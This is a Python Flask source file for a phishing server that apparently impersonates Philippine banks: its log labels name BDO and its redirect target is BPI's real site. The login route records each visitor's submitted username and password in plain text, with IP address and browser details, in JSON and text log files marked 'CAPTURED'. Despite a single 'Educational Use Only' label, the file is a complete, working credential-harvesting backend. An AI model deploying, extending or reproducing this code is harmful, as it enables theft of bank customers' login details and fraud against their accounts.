from flask import Flask, render_template, request, redirect, url_for
import datetime
import os
import socket
import json
from urllib.parse import urlparse

app = Flask(__name__)


#=========== CONFIGURATION ============
LOG_FILE = 'access.log'
JSON_LOG_FILE = 'credentials.json'
REDIRECT_URL = 'https://www.bpi.com.ph'
#======================================


def get_client_info():
    return {
        'ip': request.remote_addr,
        'user_agent': request.user_agent.string,
        'referrer': request.referrer,
        'timestamp': datetime.datetime.now().isoformat()
    }

def log_credentials(username, password):
    client_info = get_client_info()
    
    # JSON log entry
    json_entry = {
        **client_info,
        'credentials': {
            'username': username,
            'password': password
        },
        'status': 'CAPTURED',
        'action': 'CREDENTIALS_STORED'
    }
    
    # Human-readable log entry
    log_entry = f"""
[BDO PHISHING SIMULATION] - {client_info['timestamp']}
├─ IP Address: {client_info['ip']}
├─ User Agent: {client_info['user_agent']}
├─ Username: {username}
├─ Password: {password}
└─ Referrer: {client_info['referrer']}
"""
    
    # Write logs with UTF-8 encoding
    with open(JSON_LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(json_entry) + '\n')
    
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(log_entry + '\n')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username and password:
        log_credentials(username, password)
    
    # Redirect to loading page
    return redirect(url_for('loading', username=username))

@app.route('/loading')
def loading():
    username = request.args.get('username', '')
    return render_template('loading.html', username=username)

if __name__ == '__main__':
    # Create log files if they don't exist
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            f.write("BDO Phishing Simulation Log - Educational Use Only\n\n")
    
    if not os.path.exists(JSON_LOG_FILE):
        with open(JSON_LOG_FILE, 'w', encoding='utf-8') as f:
            f.write("[]\n")
    
    app.run(host='0.0.0.0', port=5000, debug=True)